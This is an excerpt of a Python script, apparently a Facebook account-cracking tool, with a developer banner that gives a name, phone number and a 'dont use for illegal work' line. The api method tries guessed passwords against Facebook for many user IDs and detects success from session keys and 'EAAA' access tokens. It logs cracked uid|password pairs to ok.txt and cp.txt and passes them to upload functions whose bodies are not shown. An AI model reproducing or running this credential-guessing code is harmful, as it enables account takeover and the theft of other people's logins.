...
class Main:
	def __init__(self):
		...
		print ("""_____ _______     __       _____ _    _
 |  __ \_   _\ \   / //\    / ____| |  | |
 | |__) || |  \ \_/ //  \  | (___ | |__| |
 |  ___/ | |   \   // /\ \  \___ \|  __  |
 | |    _| |_   | |/ ____ \ ____) | |  | |
 ...
 > \033[0;92mDEVELOPER     : PIYASH SARDAR
 > \033[0;95mFACEBOOK ID   : PIYASH SARDAR
 > \033[0;41mWHATSAPP      : 01873615592
 \033[0;96m> YOUTUBE       : PIYASH TECH
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Piyash): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [PIYASH] : %s/%s -> \033[0;92m [ PIYASH-OK:%s ]- \033[0;93m[PIYASH-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[PIYASH-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [PIYASH-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[PIYASH-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [PIYASH-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
